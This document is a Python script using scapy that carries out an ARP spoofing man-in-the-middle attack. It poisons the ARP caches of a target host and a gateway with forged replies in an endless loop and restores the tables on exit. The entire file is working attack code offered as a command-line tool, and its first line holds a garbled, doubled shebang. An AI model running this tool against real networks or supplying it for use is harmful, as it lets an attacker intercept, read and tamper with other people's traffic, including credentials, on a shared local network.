#!/usr/bin/#!/usr/bin/env python3
import time
import scapy.all as scapy
import sys
import argparse

def get_Args():
    parser = argparse.ArgumentParser(prog="Arp-spoofer", usage="-t targer | -s spoof_ip",
                                     description="ARP MITM attack", add_help=True)

    parser.add_argument("-t","--target", dest="target_ip", help="Target Host IP address :")
    parser.add_argument("-s","--spoof", dest="spoof_ip",  help="IP address to spoof (ie router) :")



    options = parser.parse_args()
    if options.target_ip is None or options.spoof_ip is None:
        print(parser.print_help())
        sys.exit(0)

    else:
        return options

def get_mac(ip):

    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    # print(arp_req_broadcast.summary())
    answer_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=0)[0]
    # print(answer_list.summary())
    #print(answer_list[0][1].hwdst)
    return answer_list[0][1].hwsrc

def restore_tables(destination_ip, source_ip):
    hw_dst = get_mac(destination_ip)
    hw_src = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=hw_dst, psrc=source_ip,hwsrc=hw_src)
    scapy.send(packet, verbose=False, count=4)


def spoof(target_ip, gw_ip):
    hw_target = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=hw_target, psrc=gw_ip)
    scapy.send(packet, verbose=False)

packet_Count = 0

options = get_Args()

try :

    while True:

        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        packet_Count += 2
        print("\r[+] Packets sent: " + str(packet_Count), end="")
        #sys.stdout.flush() python2 only ...
        time.sleep(2)

except KeyboardInterrupt:
    restore_tables(options.target_ip, options.spoof_ip)
    restore_tables(options.spoof_ip, options.target_ip)
    print("\n[*] Restoring tables.. please wait ... Done !")
    #print("\nDone ! Exiting now ...")
